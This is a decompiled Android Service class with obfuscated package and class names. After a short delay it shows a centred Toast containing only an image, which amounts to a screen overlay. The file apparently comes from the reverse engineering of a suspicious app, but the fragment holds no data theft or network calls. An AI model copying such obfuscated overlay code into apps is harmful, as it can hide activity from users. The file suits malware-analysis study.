package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.ImageView;
import android.widget.Toast;
import java.util.concurrent.TimeUnit;

/* JADX INFO: loaded from: classes.dex */
public class usbvhkriufnc extends Service {

    /* JADX INFO: renamed from: a */
    C0020b f590a = new C0020b();

    /* JADX INFO: renamed from: b */
    C0022c f591b = new C0022c();

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        try {
            TimeUnit.MILLISECONDS.sleep(1200L);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        Toast toastMakeText = Toast.makeText(getApplicationContext(), "", 1);
        toastMakeText.setGravity(16, 0, 0);
        ImageView imageView = new ImageView(this);
        imageView.setImageResource(R.drawable.qq);
        toastMakeText.setView(imageView);
        toastMakeText.show();
        return i;
    }
}
